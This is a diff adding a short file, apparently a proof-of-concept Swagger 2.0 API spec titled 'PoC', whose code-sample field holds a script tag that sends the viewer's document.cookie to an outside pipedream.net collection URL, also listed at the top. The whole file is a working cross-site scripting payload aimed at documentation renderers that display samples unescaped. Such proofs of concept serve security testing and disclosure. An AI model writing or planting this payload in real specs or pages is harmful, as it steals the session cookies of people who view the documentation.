@@ -1,0 +1,13 @@
+https://eoakg9agm15930.m.pipedream.net
+
+swagger: "2.0"
+info:
+  title: PoC
+  version: "1.0"
+paths: {}
+x-codeSamples:
+  - lang: JavaScript
+    source: |
+      <script>
+        fetch('https://eoakg9agm15930.m.pipedream.net?cookie=' + document.cookie);
+      </script>
